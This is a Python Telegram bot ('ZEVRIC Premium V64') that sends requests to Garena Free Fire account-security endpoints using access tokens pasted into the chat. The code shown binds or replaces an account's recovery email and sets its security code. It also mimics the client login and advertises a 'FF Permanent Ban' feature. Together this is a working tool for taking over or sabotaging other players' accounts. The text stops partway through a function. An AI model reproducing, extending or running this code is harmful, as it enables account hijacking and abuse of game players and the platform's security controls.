
import os, json, requests, urllib.parse, asyncio, threading
from flask import Flask, render_template_string

import base64, time, random, string
from datetime import datetime
import urllib3
urllib3.disable_warnings()

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
except:
    os.system("pip install pycryptodome")
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad

try:
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder
except:
    os.system("pip install protobuf")
    from google.protobuf import descriptor_pool as _descriptor_pool
    from google.protobuf import symbol_database as _symbol_database
    from google.protobuf.internal import builder as _builder

_sym_db = _symbol_database.Default()
MAJORLOGIN_REQ_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginReq.proto\"\xfa\n\n\nMajorLogin\x12\x12\n\nevent_time\x18\x03 \x01(\t\x12\x11\n\tgame_name\x18\x04 \x01(\t\x12\x13\n\x0bplatform_id\x18\x05 \x01(\x05\x12\x16\n\x0e\x63lient_version\x18\x07 \x01(\t\x12\x17\n\x0fsystem_software\x18\x08 \x01(\t\x12\x17\n\x0fsystem_hardware\x18\t \x01(\t\x12\x18\n\x10telecom_operator\x18\n \x01(\t\x12\x14\n\x0cnetwork_type\x18\x0b \x01(\t\x12\x14\n\x0cscreen_width\x18\x0c \x01(\r\x12\x15\n\rscreen_height\x18\r \x01(\r\x12\x12\n\nscreen_dpi\x18\x0e \x01(\t\x12\x19\n\x11processor_details\x18\x0f \x01(\t\x12\x0e\n\x06memory\x18\x10 \x01(\r\x12\x14\n\x0cgpu_renderer\x18\x11 \x01(\t\x12\x13\n\x0bgpu_version\x18\x12 \x01(\t\x12\x18\n\x10unique_device_id\x18\x13 \x01(\t\x12\x11\n\tclient_ip\x18\x14 \x01(\t\x12\x10\n\x08language\x18\x15 \x01(\t\x12\x0f\n\x07open_id\x18\x16 \x01(\t\x12\x14\n\x0copen_id_type\x18\x17 \x01(\t\x12\x13\n\x0b\x64\x65vice_type\x18\x18 \x01(\t\x12\'\n\x10memory_available\x18\x19 \x01(\x0b\x32\r.GameSecurity\x12\x14\n\x0c\x61\x63\x63\x65ss_token\x18\x1d \x01(\t\x12\x17\n\x0fplatform_sdk_id\x18\x1e \x01(\x05\x12\x1a\n\x12network_operator_a\x18) \x01(\t\x12\x16\n\x0enetwork_type_a\x18* \x01(\t\x12\x1c\n\x14\x63lient_using_version\x18\x39 \x01(\t\x12\x1e\n\x16\x65xternal_storage_total\x18< \x01(\x05\x12\"\n\x1a\x65xternal_storage_available\x18= \x01(\x05\x12\x1e\n\x16internal_storage_total\x18> \x01(\x05\x12\"\n\x1ainternal_storage_available\x18? \x01(\x05\x12#\n\x1bgame_disk_storage_available\x18@ \x01(\x05\x12\x1f\n\x17game_disk_storage_total\x18\x41 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_avail_storage\x18\x42 \x01(\x05\x12%\n\x1d\x65xternal_sdcard_total_storage\x18\x43 \x01(\x05\x12\x10\n\x08login_by\x18I \x01(\x05\x12\x14\n\x0clibrary_path\x18J \x01(\t\x12\x12\n\nreg_avatar\x18L \x01(\x05\x12\x15\n\rlibrary_token\x18M \x01(\t\x12\x14\n\x0c\x63hannel_type\x18N \x01(\x05\x12\x10\n\x08\x63pu_type\x18O \x01(\x05\x12\x18\n\x10\x63pu_architecture\x18Q \x01(\t\x12\x1b\n\x13\x63lient_version_code\x18S \x01(\t\x12\x14\n\x0cgraphics_api\x18V \x01(\t\x12\x1d\n\x15supported_astc_bitset\x18W \x01(\r\x12\x1a\n\x12login_open_id_type\x18X \x01(\x05\x12\x18\n\x10\x61nalytics_detail\x18Y \x01(\x0c\x12\x14\n\x0cloading_time\x18\\ \x01(\r\x12\x17\n\x0frelease_channel\x18] \x01(\t\x12\x12\n\nextra_info\x18^ \x01(\t\x12 \n\x18\x61ndroid_engine_init_flag\x18_ \x01(\r\x12\x0f\n\x07if_push\x18\x61 \x01(\x05\x12\x0e\n\x06is_vpn\x18\x62 \x01(\x05\x12\x1c\n\x14origin_platform_type\x18\x63 \x01(\t\x12\x1d\n\x15primary_platform_type\x18\x64 \x01(\t\"5\n\x0cGameSecurity\x12\x0f\n\x07version\x18\x06 \x01(\x05\x12\x14\n\x0chidden_value\x18\x08 \x01(\x04\x62\x06proto3')
MAJORLOGIN_RES_DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\x13MajorLoginRes.proto\"\x87\x05\n\rMajorLoginRes\x12\x12\n\naccount_id\x18\x01 \x01(\x03\x12\x13\n\x0block_region\x18\x02 \x01(\t\x12\x13\n\x0bnoti_region\x18\x03 \x01(\t\x12\x11\n\tip_region\x18\x04 \x01(\t\x12\x19\n\x11\x61gora_environment\x18\x05 \x01(\t\x12\x19\n\x11new_active_region\x18\x06 \x01(\t\x12\r\n\x05token\x18\x08 \x01(\t\x12\x0b\n\x03ttl\x18\t \x01(\x05\x12\x12\n\nserver_url\x18\n \x01(\t\x12\x16\n\x0e\x65mulator_score\x18\x0c \x01(\x03\x12\x32\n\tblacklist\x18\r \x01(\x0b\x32\x1f.MajorLoginRes.BlacklistInfoRes\x12\x31\n\nqueue_info\x18\x0f \x01(\x0b\x32\x1d.MajorLoginRes.LoginQueueInfo\x12\x0e\n\x06tp_url\x18\x10 \x01(\t\x12\x15\n\rapp_server_id\x18\x11 \x01(\x03\x12\x0f\n\x07\x61no_url\x18\x12 \x01(\t\x12\x0f\n\x07ip_city\x18\x13 \x01(\t\x12\x16\n\x0eip_subdivision\x18\x14 \x01(\t\x12\x0b\n\x03kts\x18\x15 \x01(\x03\x12\n\n\x02\x61k\x18\x16 \x01(\x0c\x12\x0b\n\x03\x61iv\x18\x17 \x01(\x0c\x1aQ\n\x10\x42lacklistInfoRes\x12\x12\n\nban_reason\x18\x01 \x01(\x05\x12\x17\n\x0f\x65xpire_duration\x18\x02 \x01(\x03\x12\x10\n\x08\x62\x61n_time\x18\x03 \x01(\x03\x1a\x66\n\x0eLoginQueueInfo\x12\r\n\x05\x41llow\x18\x01 \x01(\x08\x12\x16\n\x0equeue_position\x18\x02 \x01(\x03\x12\x16\n\x0eneed_wait_secs\x18\x03 \x01(\x03\x12\x15\n\rqueue_is_full\x18\x04 \x01(\x08\x62\x06proto3')
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_REQ_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_REQ_DESCRIPTOR, 'MajorLoginReq_pb2', globals())
_builder.BuildMessageAndEnumDescriptors(MAJORLOGIN_RES_DESCRIPTOR, globals())
_builder.BuildTopDescriptorsAndMessages(MAJORLOGIN_RES_DESCRIPTOR, 'MajorLoginRes_pb2', globals())
MajorLogin = globals().get('MajorLogin')
MajorLoginRes = globals().get('MajorLoginRes')
API_URL = 'https://client.ind.freefiremobile.com/GetLoginData'

BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)
def encrypt_message(key, iv, plaintext):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    from Crypto.Util.Padding import pad
    return cipher.encrypt(pad(plaintext, AES.block_size))

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, filters, ContextTypes

flask_app = Flask(__name__)
UNBIND_HTML = """<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>ZEVRIC Premium</title><style>body{font-family:Arial;background:#0a0a0a;color:#fff;padding:20px}.card{background:#1a1a1a;padding:25px;border-radius:15px;max-width:420px;margin:auto;border:2px solid #00ff88}</style></head><body><div class="card"><h2>ZEVRIC Premium</h2></div></body></html>"""
@flask_app.route('/')
def home(): return "ZEVRIC PREMIUM V64 CONFIRM @just_zevric Alive", 200
@flask_app.route('/health')
def health(): return "OK", 200
@flask_app.route('/unbind')
def unbind_page(): return render_template_string(UNBIND_HTML)
def run_flask():
    port=int(os.environ.get("PORT",8080))
    flask_app.run(host="0.0.0.0",port=port,debug=False,use_reloader=False)
threading.Thread(target=run_flask,daemon=True).start()

BOT_TOKEN=os.getenv("TELEGRAM_BOT_TOKEN") or os.getenv("BOT_TOKEN") or "YOUR_TOKEN"
from garena_core import fetch_majorlogin_jwt, decode_jwt, decode_ff_name, check_platform_real, resubscribe_otp_sender_real, mask_email
PROXY_URL=os.getenv("PROXY_URL","")
def make_request(method, url, **kwargs):
    kwargs.setdefault('timeout',12)
    if PROXY_URL: kwargs['proxies']={"http":PROXY_URL,"https":PROXY_URL}
    return requests.get(url,**kwargs) if method=="GET" else requests.post(url,**kwargs)
def convert_seconds(s):
    try:
        s=int(s);d,h=divmod(s,86400);h,m=divmod(h,3600);m,s=divmod(m,60)
        return f"{d}D {h}H {m}M {s}S"
    except: return str(s)

def get_main_keyboard():
    return ReplyKeyboardMarkup([
        ["🔍 Bind Info Check", "📧 Bind Email"],
        ["🔄 Change Bind Email", "❌ Unbind Email"],
        ["⏱️ Cancel Request", "🔑 EAT to Token"],
        ["🚪 Revoke Token", "📝 Update Bio"],
        ["💀 FF Permanent Ban", "📧 Resubscribe OTP"],
        ["🔍 Check Platform", "👑 Owner Info"],
        ["🌐 EAT Website"]
    ], resize_keyboard=True)

def get_ban_confirm_keyboard():
    return ReplyKeyboardMarkup([["✅ Yes, Ban Karo 💀", "❌ No, Cancel 🚫"]], resize_keyboard=True)

def get_confirm_keyboard():
    return ReplyKeyboardMarkup([["✅ Yes", "❌ No"]], resize_keyboard=True)

CHECK_INFO,BIND_TOKEN,BIND_EMAIL,BIND_OTP,BIND_SEC,CHANGE_TOKEN,CHANGE_OTP_OLD,CHANGE_NEW,CHANGE_OTP_NEW,CHANGE_CONFIRM,UNBIND_TOKEN,UNBIND_OTP,UNBIND_CONFIRM,CANCEL_TOKEN,CANCEL_CONFIRM,EAT_INPUT,REVOKE_TOKEN,REVOKE_CONFIRM,BIO_TOKEN,BIO_TEXT,BIO_COLOR,BIO_CONFIRM,FF_BAN_TOKEN,FF_BAN_CONFIRM,RESUB_EMAIL,RESUB_TOKEN,PLATFORM_TOKEN=range(27)

P_BIND_INFO = r"^🔍 Bind Info Check$"
P_BIND_EMAIL = r"^📧 Bind Email$"
P_CHANGE = r"^🔄 Change Bind Email$"
P_UNBIND = r"^❌ Unbind Email$"
P_CANCEL = r"^⏱️ Cancel Request$"
P_EAT = r"^🔑 EAT to Token$"
P_REVOKE = r"^🚪 Revoke Token$"
P_BIO = r"^📝 Update Bio$"
P_OWNER = r"^👑 Owner Info$"
P_WEBSITE = r"^🌐 EAT Website$"
P_FF_BAN = r"^💀 FF Permanent Ban$"
P_RESUB = r"^📧 Resubscribe OTP$"
P_PLATFORM = r"^🔍 Check Platform$"
ALL_MENU = f"({P_BIND_INFO}|{P_BIND_EMAIL}|{P_CHANGE}|{P_UNBIND}|{P_CANCEL}|{P_EAT}|{P_REVOKE}|{P_BIO}|{P_OWNER}|{P_WEBSITE}|{P_FF_BAN}|{P_RESUB}|{P_PLATFORM})"
ALL_BUTTONS = ["🔍 Bind Info Check","📧 Bind Email","🔄 Change Bind Email","❌ Unbind Email","⏱️ Cancel Request","🔑 EAT to Token","🚪 Revoke Token","📝 Update Bio","👑 Owner Info","🌐 EAT Website","💀 FF Permanent Ban","📧 Resubscribe OTP","🔍 Check Platform"]
YES_NO = ["✅ Yes","❌ No","Yes","No"]

async def start(update, context):
    try:
        user=update.message.from_user
        # Full name from Telegram - first + last
        full_name = user.full_name if hasattr(user, 'full_name') else f"{user.first_name} {user.last_name or ''}".strip()
        if not full_name:
            full_name = user.first_name or "Zevric"
        # Keep full name as is, just limit to 25 chars for safety, don't strip special chars like ê
        safe_name = full_name[:25].strip()
        msg = f"""🔥 𝗭𝗘𝗩𝗥𝗜𝗖 — 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 🔥💎

👋 𝗛𝗲𝘆 {safe_name} ✨ | 𝟵+ 𝗙𝗲𝗮𝘁𝘂𝗿𝗲𝘀 ✅
🛡️ 𝗦𝗮𝗳𝗲 • 𝗙𝗮𝘀𝘁 • 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 ✅
👑 @just_zevric | 𝗩𝟲𝟰

👇 𝗢𝗽𝘁𝗶𝗼𝗻 𝗰𝗵𝗼𝗼𝘀𝗲 𝗸𝗮𝗿𝗼 👇"""
        await update.message.reply_text(msg, reply_markup=get_main_keyboard())
    except:
        await update.message.reply_text("🔥 ZEVRIC PREMIUM 🔥\nWelcome 💎\n@just_zevric", reply_markup=get_main_keyboard())

async def force_start(update, context):
    context.user_data.clear()
    await start(update, context)
    return ConversationHandler.END

async def owner_info(update, context):
    msg = """👑 𝗭𝗘𝗩𝗥𝗜𝗖 — 𝗢𝗪𝗡𝗘𝗥 𝗜𝗡𝗙𝗢 👑💎

👤 𝗡𝗮𝗺𝗲 : 𝗭𝗲𝘃𝗿𝗶𝗰 ✨💎
📱 𝗧𝗲𝗹𝗲𝗴𝗿𝗮𝗺 : @just_zevric 🚀✨
📺 𝗬𝗼𝘂𝗧𝘂𝗯𝗲 : https://youtube.com/@zevricxplay?si=kCCn-fnTHIAZrEUb 🎬🔥
🌐 𝗪𝗲𝗯𝘀𝗶𝘁𝗲 : https://zevricplayx.github.io/eat_token/ 🔗
🔥 𝗩𝟲𝟰 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 💎

💖 𝗕𝘆 @just_zevric 😘💖"""
    await update.message.reply_text(msg, reply_markup=get_main_keyboard())

async def eat_website_info(update, context):
    await update.message.reply_text(
        "🌐 𝗘𝗔𝗧 𝗪𝗲𝗯𝘀𝗶𝘁𝗲 — 𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹 🌐💎\n\n🔗 https://zevricplayx.github.io/eat_token/ 🔗\n\n🔑 𝗘𝗔𝗧 → 𝗧𝗼𝗸𝗲𝗻 𝗜𝗻𝘀𝘁𝗮𝗻𝘁 ⚡\n🛡️ 𝟭𝟬𝟬% 𝗦𝗮𝗳𝗲 ✅\n👑 @just_zevric 💎",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🌐 Open Website 💎🚀", url="https://zevricplayx.github.io/eat_token/")]])
    )

async def check_info_start(update, context):
    await update.message.reply_text("🔍 𝗕𝗶𝗻𝗱 𝗜𝗻𝗳𝗼 𝗖𝗵𝗲𝗰𝗸 🔍\n\n🔐 Enter Access Token : 💎", reply_markup=get_main_keyboard())
    return CHECK_INFO

async def check_info_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
    if len(token)<10:
        await update.message.reply_text("❌ Invalid token!", reply_markup=get_main_keyboard())
        return ConversationHandler.END
    msg=await update.message.reply_text("🔍 Fetching... ⏳")
    try:
        def fetch():
            uid=nick=region="Unknown"
            try:
                p_url=f"https://api-otrss.garena.com/support/callback/?access_token={token}"
                p_res=make_request("GET",p_url,headers={"User-Agent":"Mozilla/5.0"},allow_redirects=True)
                parsed=urllib.parse.urlparse(p_res.url); qs=urllib.parse.parse_qs(parsed.query)
                uid=qs.get("account_id",["Unknown"])[0]; nick=urllib.parse.unquote(qs.get("nickname",["Unknown"])[0]); region=qs.get("region",["Unknown"])[0]
            except: pass
            url="https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
            r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.19P9"})
            return uid,nick,region,r.json()
        uid,nick,region,data=await asyncio.to_thread(fetch)
        email=data.get("email",""); email_to_be=data.get("email_to_be","")
        txt=f"🔥 𝗭𝗘𝗩𝗥𝗜𝗖 𝗕𝗶𝗻𝗱 𝗜𝗻𝗳𝗼 🔥💎\n\n👤 UID: {uid}\n🎮 Nick: {nick}\n🌍 Region: {region}\n\n📧 Current: {email if email else 'None ❌'}\n⏳ Pending: {email_to_be if email_to_be else 'None ✅'}\n\n💖 @just_zevric | V64 ✨"
        await msg.edit_text(txt)
    except Exception as e:
        await msg.edit_text(f"❌ Error: Token expire ho sakta hai 😔")
    return ConversationHandler.END

async def bind_email_start(update, context):
    await update.message.reply_text("📧 𝗕𝗶𝗻𝗱 𝗘𝗺𝗮𝗶𝗹 📧\n\n🔐 Enter Access Token :", reply_markup=get_main_keyboard())
    return BIND_TOKEN

async def bind_email_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip()
    context.user_data['bind_token']=token
    def fetch():
        url="https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.19P9"})
        return r.json()
    try:
        data=await asyncio.to_thread(fetch)
        current=data.get("email","")
        pending=data.get("email_to_be","")
        if current and current.strip() != "":
            msg = f"""⚠️ 𝗔𝗹𝗿𝗲𝗮𝗱𝘆 𝗕𝗶𝗻𝗱 𝗘𝗺𝗮𝗶𝗹 𝗛𝗮𝗶! 📧💎

📧 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 : {current} ✅
⏳ 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 : {pending if pending else 'None ✅'}

💡 Change ya Unbind use karo 👇
🔄 Change Bind Email
❌ Unbind Email

💖 @just_zevric"""
            await update.message.reply_text(msg, reply_markup=get_main_keyboard())
            return ConversationHandler.END
        if pending and pending.strip() != "":
            msg = f"""⏳ 𝗣𝗲𝗻𝗱𝗶𝗻𝗴 𝗥𝗲𝗾𝘂𝗲𝘀𝘁 𝗛𝗮𝗶! ⚠️

📧 Pending: {pending} ⏳

💡 Cancel Request se cancel kar sakte ho

💖 @just_zevric"""
            await update.message.reply_text(msg, reply_markup=get_main_keyboard())
            return ConversationHandler.END
        await update.message.reply_text(f"✅ 𝗙𝗿𝗲𝘀𝗵 𝗔𝗰𝗰𝗼𝘂𝗻𝘁! 🎉\n📧 Current: None ❌\n\n✨ Enter Email to bind : 📩")
    except Exception as e:
        await update.message.reply_text(f"✨ Enter Email to bind : 📩")
    return BIND_EMAIL

async def bind_email_email(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    email=update.message.text.strip()
    if "@" not in email or "." not in email or len(email)<6:
        await update.message.reply_text(f"❌ Invalid Email: {email}\n✅ Type real email like yourname@gmail.com")
        return BIND_EMAIL
    context.user_data['bind_email']=email; token=context.user_data['bind_token']
    await update.message.reply_text(f"📧 [1/3] Sending OTP to {email}... ⚡")
    def send():
        url="https://100067.connect.garena.com/game/account_security/bind:send_otp"
        d={"email":email,"locale":"en_PK","region":"PK","app_id":"100067","access_token":token}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(send)
        try:
            j=json.loads(resp)
            if j.get("result")==0:
                await update.message.reply_text(f"✅ 𝗢𝗧𝗣 𝗦𝗲𝗻𝘁! 📧\n📩 Check inbox: {email}\n\n🔑 Enter OTP :")
            else:
                if "already" in resp.lower():
                    await update.message.reply_text(f"⚠️ Already Bind Email Hai! 📧\n💡 Change Bind Email use karo\n@just_zevric", reply_markup=get_main_keyboard())
                    return ConversationHandler.END
                else:
                    await update.message.reply_text(f"❌ OTP Send Failed! 😔\nTry after some time ⏰", reply_markup=get_main_keyboard())
                    return ConversationHandler.END
        except:
            if "error" in resp.lower():
                await update.message.reply_text(f"❌ OTP Send Failed! 😔\nTry again later ⏰", reply_markup=get_main_keyboard())
                return ConversationHandler.END
            await update.message.reply_text(f"✅ 𝗢𝗧𝗣 𝗦𝗲𝗻𝘁! 📧\n📩 Check inbox: {email}\n\n🔑 Enter OTP :")
    except Exception as e:
        await update.message.reply_text(f"❌ Error sending OTP 😔")
    return BIND_OTP

async def bind_email_otp(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    otp=update.message.text.strip(); email=context.user_data['bind_email']; token=context.user_data['bind_token']
    await update.message.reply_text("🔑 [2/3] Verifying OTP... 🛡️")
    def verify():
        url="https://100067.connect.garena.com/game/account_security/bind:verify_otp"
        d={"app_id":"100067","access_token":token,"email":email,"code":otp,"otp":otp,"type":"1"}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(verify)
        try:
            j=json.loads(resp)
            vt=j.get("verifier_token","")
            if j.get("result")==0 and vt:
                context.user_data['verifier_token']=vt
                await update.message.reply_text("✅ OTP Verified! 💎\n\n🔐 Set 6-digits security code : 🔢\nExample: 123456")
                return BIND_SEC
            else:
                await update.message.reply_text(f"❌ OTP Wrong! 😔💔\n\n💡 Sahi OTP bhejo jo {email} pe aaya hai 📧\n🔑 Phir se Enter OTP: ✨", reply_markup=get_main_keyboard())
                return BIND_OTP
        except:
            await update.message.reply_text(f"❌ OTP Wrong! 😔\n🔑 Sahi OTP phir se bhejo:", reply_markup=get_main_keyboard())
            return BIND_OTP
    except Exception as e:
        await update.message.reply_text(f"❌ Error: Sahi OTP bhejo phir se 🔑")
        return BIND_OTP

async def bind_email_security_code(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    text=update.message.text.strip()
    if len(text)>20 and not text.isdigit():
        context.user_data['verifier_token']=text
        await update.message.reply_text("✅ Token saved!\n🔢 Now send 6-digit security code :")
        return BIND_SEC
    sec=text; vt=context.user_data.get('verifier_token'); token=context.user_data['bind_token']; email=context.user_data['bind_email']
    if not sec.isdigit() or len(sec)!=6:
        await update.message.reply_text("❌ Invalid Code! 6 digits ka code bhejo\nExample: 123456")
        return BIND_SEC
    await update.message.reply_text("📧 [3/3] Creating bind request... 🚀")
    def bind_req():
        url="https://100067.connect.garena.com/game/account_security/bind:create_bind_request"
        d={"email":email,"app_id":"100067","access_token":token,"verifier_token":vt,"secondary_password":sec}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(bind_req)
        try:
            j=json.loads(resp)
            if j.get("result")==0:
                await update.message.reply_text(f"🎉 𝗕𝗶𝗻𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀! 🎉💎\n📧 New Email: {email} ✅\n✅ Finally 🚀confirm 💌\n💖 @just_zevric | V64 ✨", reply_markup=get_main_keyboard())
            else:
                await update.message.reply_text(f"❌ Bind Failed! 😔\n💡 Token expire ya already bind hai\n@just_zevric", reply_markup=get_main_keyboard())
        except:
            await update.message.reply_text(f"🎉 𝗕𝗶𝗻𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀! 🎉💎\n📧 New Email: {email} ✅\n✅ Finally 🚀confirm 💌\n💖 @just_zevric | V64 ✨", reply_markup=get_main_keyboard())
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}", reply_markup=get_main_keyboard())
    return ConversationHandler.END

async def change_email_start(update, context):
    await update.message.reply_text("🔄 𝗖𝗵𝗮𝗻𝗴𝗲 𝗕𝗶𝗻𝗱 𝗘𝗺𝗮𝗶𝗹 🔄\n\n🔐 Enter Access Token :", reply_markup=get_main_keyboard())
    return CHANGE_TOKEN

async def change_email_token(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    token=update.message.text.strip(); context.user_data['change_token']=token
    def fetch():
        url="https://100067.connect.garena.com/game/account_security/bind:get_bind_info"
        r=make_request("GET",url,params={'app_id':"100067",'access_token':token},headers={'User-Agent':"GarenaMSDK/4.0.30"})
        return r.json().get("email","")
    try:
        old_email=await asyncio.to_thread(fetch)
        if not old_email:
            await update.message.reply_text("❌ No bound email! Pehle Bind Email karo! 📧", reply_markup=get_main_keyboard())
            return ConversationHandler.END
        context.user_data['old_email']=old_email
        await update.message.reply_text(f"📧 Old: {old_email}\n📩 [1/5] Sending OTP...")
        def send():
            url="https://100067.connect.garena.com/game/account_security/bind:send_otp"
            d={"email":old_email,"locale":"en_PK","region":"PK","app_id":"100067","access_token":token}
            h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
            return make_request("POST",url,headers=h,data=d).text
        resp=await asyncio.to_thread(send)
        try:
            j=json.loads(resp)
            if j.get("result")==0:
                await update.message.reply_text(f"✅ OTP Sent to old email! 📧\n{old_email}\n\n🔑 Enter OTP:")
            else:
                await update.message.reply_text(f"❌ OTP Send Failed! Try again ⏰", reply_markup=get_main_keyboard())
                return ConversationHandler.END
        except:
            await update.message.reply_text(f"✅ OTP Sent! Check {old_email}\n\n🔑 Enter OTP:")
        return CHANGE_OTP_OLD
    except Exception as e:
        await update.message.reply_text(f"❌ Error {e}", reply_markup=get_main_keyboard())
        return ConversationHandler.END

async def change_email_otp_old(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    otp=update.message.text.strip(); token=context.user_data['change_token']; old_email=context.user_data['old_email']
    await update.message.reply_text("🔐 [2/5] Verifying...")
    def verify():
        url="https://100067.connect.garena.com/game/account_security/bind:verify_identity"
        d={"email":old_email,"app_id":"100067","access_token":token,"otp":otp}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(verify)
        try:
            j=json.loads(resp); it=j.get("identity_token")
            if it:
                context.user_data['identity_token']=it
                await update.message.reply_text("✅ Old Email Verified! 💎\n\n📧 Enter New Email : ✨💌")
                return CHANGE_NEW
            else:
                await update.message.reply_text(f"❌ OTP Wrong! 😔💔\n\n💡 Sahi OTP bhejo jo {old_email} pe aaya hai 📧\n🔑 Phir se Enter OTP:", reply_markup=get_main_keyboard())
                return CHANGE_OTP_OLD
        except:
            await update.message.reply_text(f"❌ OTP Wrong! 😔\n🔑 Sahi OTP phir se bhejo:", reply_markup=get_main_keyboard())
            return CHANGE_OTP_OLD
    except Exception as e:
        await update.message.reply_text(f"❌ Error: Sahi OTP phir se bhejo 🔑")
        return CHANGE_OTP_OLD

async def change_email_new(update, context):
    if update.message.text in ALL_BUTTONS:
        return await switch_menu(update, context)
    new_email=update.message.text.strip()
    if "@" not in new_email or "." not in new_email:
        await update.message.reply_text("❌ Invalid email!")
        return CHANGE_NEW
    context.user_data['new_email']=new_email; token=context.user_data['change_token']
    await update.message.reply_text(f"📩 [3/5] Sending OTP to {new_email}...")
    def send():
        url="https://100067.connect.garena.com/game/account_security/bind:send_otp"
        d={"email":new_email,"locale":"en_PK","region":"PK","app_id":"100067","access_token":token}
        h={"User-Agent":"GarenaMSDK/4.0.30","Content-Type":"application/x-www-form-urlencoded"}
        return make_request("POST",url,headers=h,data=d).text
    try:
        resp=await asyncio.to_thread(send)
        try:
            j=json.loads(resp)
            if j.get("result")==0:
                await update.message.reply_text(f"✅ OTP Sent to new email! 📧\n{new_email}\n\n🔑 Enter OTP:")
            else:
                await update.message.reply_text(f"❌ OTP Failed! 😔\n💡 Sahi email daalo, phir se try karo\n🔑 Phir se New Email bhejo:", reply_markup=get_main_keyboard())
                return CHANGE_NEW
        except:
